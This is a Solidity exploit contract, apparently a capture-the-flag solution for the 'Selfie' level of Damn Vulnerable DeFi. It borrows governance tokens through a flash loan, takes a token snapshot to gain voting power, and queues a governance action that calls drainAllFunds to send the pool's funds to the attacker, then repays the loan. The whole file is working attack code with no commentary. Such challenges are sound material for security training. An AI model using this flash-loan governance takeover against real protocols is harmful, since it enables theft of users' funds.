// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";

contract SelfieHack {

    
    DamnValuableTokenSnapshot public token;
    SelfiePool pool;
    SimpleGovernance  gov;
    address payable attacker;
    uint256 public actionId;

    constructor (address _token, address _pool, address _gov) {
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        gov = SimpleGovernance(_gov);
        attacker = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveTokens(address tokenaddr, uint256 amount) external {        
        token.snapshot();
        token.transfer(msg.sender, amount);
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
            );        
        actionId = gov.queueAction(address(pool), data, 0);        
    }
}
